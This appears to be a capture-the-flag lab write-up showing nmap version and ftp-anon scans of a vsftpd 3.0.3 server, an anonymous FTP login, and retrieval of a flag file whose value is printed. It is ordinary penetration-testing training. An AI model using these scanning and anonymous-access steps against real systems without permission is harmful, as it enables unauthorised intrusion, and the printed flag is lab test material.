# Thhis time we observe vsftpd version, 
vsftpd, very secure FTP daemon, is an FTP server for many Unix-like systems, including Linux, and is often the default FTP server for many Linux distributions as well. vsftpd is beneficial for optimizing security, performance, and stability.

root@attackdefense:~# `nmap 192.176.71.3 -p 21 -sV`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-07 05:38 UTC
Nmap scan report for target-1 (192.176.71.3)
Host is up (0.000053s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
MAC Address: 02:42:C0:B0:47:03 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds
root@attackdefense:~# 

# Checking if anonyumous login is allowed, we obseve that its allowed , the FTP server is vulnerable, It also tells us that there is read access to flag and execute access to pub

root@attackdefense:~# `nmap 192.176.71.3 -p 21 --script ftp-anon`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-07 05:42 UTC
Nmap scan report for target-1 (192.176.71.3)
Host is up (0.000057s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Dec 18  2018 flag
|_drwxr-xr-x    2 ftp      ftp          4096 Dec 18  2018 pub
MAC Address: 02:42:C0:B0:47:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds

# We can login with anonymous user and blank pass, and get the flag

root@attackdefense:~# `ftp 192.176.71.3  `        
Connected to 192.176.71.3.
220 (vsFTPd 3.0.3)
Name (192.176.71.3:root): `anonymous`
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> `ls`
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Dec 18  2018 flag
drwxr-xr-x    2 ftp      ftp          4096 Dec 18  2018 pub
226 Directory send OK.
ftp> `get flag`
local: flag remote: flag
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag (33 bytes).
226 Transfer complete.
33 bytes received in 0.00 secs (251.7700 kB/s)
ftp> `bye`
221 Goodbye.
root@attackdefense:~# `ls`
README  flag  tools  wordlists
root@attackdefense:~# `cat flag`
4267bdfbff77d7c2635e4572519a8b9c